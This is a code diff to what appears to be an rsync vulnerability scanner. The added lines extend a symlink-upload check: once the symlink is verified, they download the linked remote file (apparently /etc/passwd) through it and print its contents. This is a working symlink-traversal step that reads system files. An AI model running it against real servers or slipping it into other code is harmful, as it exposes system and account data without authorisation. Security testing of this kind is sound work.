@@ -53,12 +53,14 @@ def _upload_symlink(ctx, module):
                 ctx.out(f"Symlink upload to module {module} was unsuccessful: {detail}", "OK", indent=4)
             else:
                 try:
+                    print(f"Verifying the uploaded symlink in module {module}/{link_name}")
                     verify = subprocess.run(
                         [
                             "rsync",
                             "--list-only",
                             "--no-motd",
                             "--contimeout=5",
+                            "-l",
                             rsync_url(ctx, f"{module}/{link_name}"),
                         ],
                         capture_output=True,
@@ -82,6 +84,41 @@ def _upload_symlink(ctx, module):
                     )
                     if verified:
                         ctx.out(f"Uploaded and verified symlink to {_SYMLINK_TARGET} in module {module}", "VULN", indent=4)
+                        contents_path = os.path.join(tmpdir, "remote_passwd")
+                        try:
+                            read_result = subprocess.run(
+                                [
+                                    "rsync",
+                                    "--copy-links",
+                                    "--no-motd",
+                                    "--contimeout=5",
+                                    rsync_url(ctx, f"{module}/{link_name}"),
+                                    contents_path,
+                                ],
+                                capture_output=True,
+                                text=True,
+                                input="",
+                                env=env,
+                                timeout=ctx.timeout,
+                            )
+                        except subprocess.TimeoutExpired:
+                            ctx.out(f"Timed out reading {_SYMLINK_TARGET} through the verified symlink", "OK", indent=4)
+                        except FileNotFoundError:
+                            ctx.out("rsync client binary not found on this machine", "ERROR", indent=4)
+                        else:
+                            if read_result.returncode == 0 and os.path.isfile(contents_path):
+                                with open(contents_path, encoding="utf-8") as passwd_file:
+                                    contents = passwd_file.read()
+                                ctx.out(f"Contents read through the remote symlink in module {module}:", "INFO", indent=4)
+                                ctx.out(contents, "TEXT", indent=8)
+                            else:
+                                detail = read_result.stderr.strip().splitlines()
+                                detail = detail[0] if detail else (
+                                    f"rsync exited with status {read_result.returncode}"
+                                    if read_result.returncode != 0
+                                    else "rsync did not create the downloaded file"
+                                )
+                                ctx.out(f"Could not read {_SYMLINK_TARGET} through the verified symlink: {detail}", "OK", indent=4)
                     else:
                         ctx.out(f"Symlink upload to module {module} could not be verified", "OK", indent=4)
 
